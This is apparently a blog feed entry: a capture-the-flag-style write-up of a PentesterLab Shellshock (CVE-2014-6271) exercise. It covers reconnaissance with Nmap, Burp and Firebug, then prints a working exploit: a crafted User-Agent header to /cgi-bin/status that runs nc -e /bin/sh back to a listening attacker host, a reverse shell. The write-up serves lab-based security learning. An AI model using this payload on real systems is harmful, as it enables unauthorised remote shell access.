<p><img src="http://wg135.github.io/images/blog/pentesterlab/shellshock/game_over.jpg" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentesterlab--CVE-2014-6271/Shellshock]]></title>
    <link href="http://wg135.github.io/blog/2016/03/25/pentesterlab-cve2014-6271-slash-shellshock/"/>
    <updated>2016-03-25T14:40:03-05:00</updated>
    <id>http://wg135.github.io/blog/2016/03/25/pentesterlab-cve2014-6271-slash-shellshock</id>
    <content type="html"><![CDATA[<p><em>So it is said that if you know your enemies and know yourself, you will not be put at risk even if you have a hundred battles.</em> &mdash;&ndash; The Art of War</p>

<p>This vulnerability impacts the Bourne Again Shell &ldquo;Bash&rdquo;. Bash is not usually available through a web application but can be indirectly exposed through a Common Gateway Interface &ldquo;CGI&rdquo;.</p>

<p>Difficluty: 1/5</p>

<!--more-->


<h3>Forces:</h3>

<ul>
<li>Nmap</li>
<li>Burp</li>
<li>Firebug</li>
<li>NC</li>
</ul>


<h3>Detail Assessment and Planning</h3>

<ul>
<li>Port scan to identify opened ports, running services and services version. &mdash;-Nmap</li>
<li>Identify vulnerability and path <code>/cgi-bin/status</code>. &mdash;-Burp, Firebug</li>
<li>Exploit shellshock vuln get the reverse shell &mdash;- NC</li>
</ul>


<h3>Waging War</h3>

<h4>Weaknesses and Strengths</h4>

<p>Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/shellshock/shellshock1.png" title="[title manually exploit [alt text]]" ></p>

<p>By visiting the application with Burp, I can detect that multiple URL are accessed when the page is loaded:</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/shellshock/shellshock2.png" title="[title manually exploit [alt text]]" ></p>

<p>Also by using Firebug, I can identify that CGI page which call system command <code>/cgi-bin/status</code></p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/shellshock/shellshock3.png" title="[title manually exploit [alt text]]" ></p>

<h4>Attack</h4>

<h5>listen port 443</h5>

<p><code># nc -l -p 443</code></p>

<h5>exploit</h5>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.79.156 443 -e /bin/sh\r\nHost: 192.168.79.164\r\nConnection: close\r\n\r\n" | nc 192.168.79.164 80</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/pentesterlab/shellshock/shellshock5.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.156 is the attacker&rsquo;s machine and 192.168.79.164 is victim machine.</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/shellshock/shellshock6.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/shellshock/game_over.jpg" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
</feed>
